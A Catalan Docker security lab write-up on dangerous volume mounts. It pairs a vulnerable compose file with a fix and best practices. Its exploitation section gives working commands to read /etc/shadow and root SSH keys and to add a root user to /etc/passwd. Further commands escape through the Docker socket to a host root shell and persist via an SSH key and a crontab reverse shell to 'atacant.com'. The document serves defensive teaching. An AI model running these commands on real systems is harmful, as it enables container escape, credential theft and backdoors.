# Vulnerabilitat 7: Muntatges Perillosos

## Descripció Breu

Els muntatges de volums (volumes) permeten que un contenidor Docker accedeixi a directoris del sistema host. Quan es munten directoris sensibles com l'arrel del sistema (/), /etc, /var o el socket de Docker (/var/run/docker.sock), un atacant que comprometi el contenidor pot obtenir control total sobre el host. Aquesta vulnerabilitat és una de les mes habituals en escapaments de contenidors.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Acces a fitxers sensibles del host com /etc/shadow o claus SSH
- **Integritat** -> Modificacio de fitxers de configuracio del sistema host
- **Disponibilitat** -> Eliminacio de fitxers critics del sistema o aturada de serveis

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Critic |
| **CVE relacionat** | CWE-284 (Improper Access Control) |
| **Impacte real** | Escapament complet del contenidor i control total del host |
| **Escenari tipic** | Muntatge de /var/run/docker.sock per crear contenidors privilegiats des de dins |

### Muntatges especialment perillosos

| Muntatge | Risc |
|---|---|
| `/:/host` | Acces complet al sistema de fitxers del host |
| `/var/run/docker.sock` | Control total del daemon Docker, pot crear contenidors privilegiats |
| `/etc` | Modificacio d'usuaris, contrasenyes i configuracions del sistema |
| `/root` | Acces a claus SSH, fitxers de configuracio i historial de root |
| `/proc` | Acces a informacio de processos i configuracio del kernel |
| `/sys` | Modificacio de parametres del kernel |

---

## Implementació Vulnerable

```dockerfile
# Vulnerable: contenidor amb muntatges perillosos al host
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y python3

WORKDIR /app

CMD ["python3", "-m", "http.server", "8080"]
```

```yaml
# docker-compose.yml vulnerable
services:
  vulnerable-mounts:
    volumes:
      - /:/host
      - /var/run/docker.sock:/var/run/docker.sock
```

### Verificació de la vulnerabilitat

```bash
# Construir i executar el contenidor vulnerable
docker-compose up -d vulnerable-mounts

# Comprovar els muntatges actius
docker inspect vuln-dangerous-mounts | grep -A10 "Mounts"
```

**Resultat esperat:**
```json
"Mounts": [
    {
        "Source": "/",
        "Destination": "/host",
        "Mode": "rw"
    },
    {
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock"
    }
]
```

---

## Com Explotar

### Pas 1: Acces al sistema de fitxers del host via muntatge /
```bash
# Entrar al contenidor vulnerable
docker exec -it vuln-dangerous-mounts bash

# Llegir fitxers sensibles del host
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
cat /host/etc/passwd

# Modificar fitxers del host
echo "atacant:x:0:0:root:/root:/bin/bash" >> /host/etc/passwd
```

### Pas 2: Escapament via Docker socket
```bash
# Entrar al contenidor vulnerable
docker exec -it vuln-dangerous-mounts bash

# Instal·lar Docker CLI dins del contenidor
apt-get install -y docker.io

# Usar el socket muntat per crear un contenidor privilegiat nou
docker -H unix:///var/run/docker.sock run -it \
  --privileged \
  --pid=host \
  -v /:/host \
  ubuntu:22.04 chroot /host bash

# Ara tenim shell de root al host real
whoami   # root (del host)
```

### Pas 3: Persistencia al host
```bash
# Des del contenidor amb acces a /host
# Afegir clau SSH per acces persistent al host
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA... atacant@maquina" >> /host/root/.ssh/authorized_keys

# O crear un cron job al host
echo "* * * * * root bash -i >& /dev/tcp/atacant.com/4444 0>&1" \
     >> /host/etc/crontab
```

---

## Solució — docker-compose.yml

```yaml
services:
  fixed-mounts:
    build:
      context: .
      dockerfile: Dockerfile.fixed
    container_name: fixed-dangerous-mounts
    volumes:
      # Nomes es munta la carpeta estrictament necessaria i en nomes lectura
      - ./data:/app/data:ro
```

### Verificació de la correcció

```bash
# Construir i executar el contenidor corregit
docker-compose up -d fixed-mounts

# Comprovar els muntatges
docker inspect fixed-dangerous-mounts | grep -A10 "Mounts"
```

**Resultat esperat:**
```json
"Mounts": [
    {
        "Source": "/home/usuari/DockerSecLab/data",
        "Destination": "/app/data",
        "Mode": "ro"
    }
]
```

```bash
# Intentar accedir a fitxers del host des del contenidor
docker exec -it fixed-dangerous-mounts bash
ls /host
# Output: No existeix /host

cat /etc/shadow
# Output: Permission denied

# Intentar escriure a la carpeta muntada
touch /app/data/fitxer.txt
# Output: Read-only file system
```

---

## Explicació de la Solució

| Mesura | Funcio |
|---|---|
| Eliminar el muntatge de `/` | El contenidor no te acces al sistema de fitxers del host |
| Eliminar `/var/run/docker.sock` | El contenidor no pot controlar el daemon Docker |
| Muntar nomes directoris especifics | Principi de minim acces aplicat als volums |
| Afegir `:ro` al muntatge | El contenidor pot llegir pero no modificar les dades muntades |

### Quan es necessari el Docker socket

En alguns casos legitims (ex. eines de monitoritzacio com Portainer) cal accedir al socket. En aquests casos cal aplicar mesures addicionals:

```yaml
# Si es imprescindible usar el socket, restringir al maxim
services:
  monitoring:
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
    # Nomes lectura i usuari no privilegiat
    user: "1001:1001"
    security_opt:
      - no-new-privileges:true
```

---

## Bones Practiques

- Mai muntar directoris del sistema com /, /etc, /var, /proc o /sys
- Mai muntar /var/run/docker.sock tret que sigui estrictament necessari
- Usar sempre `:ro` (read-only) si el contenidor nomes necessita llegir les dades
- Muntar nomes subdirectoris especifics en lloc de directoris pare complets
- Usar Docker volumes gestionats en lloc de bind mounts quan sigui possible
- Auditar periodacament els muntatges actius amb `docker inspect`

---

## Referencies

- [Docker Volumes Documentation](https://docs.docker.com/storage/volumes/)
- [Docker Socket Security](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Escaping Docker Containers - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
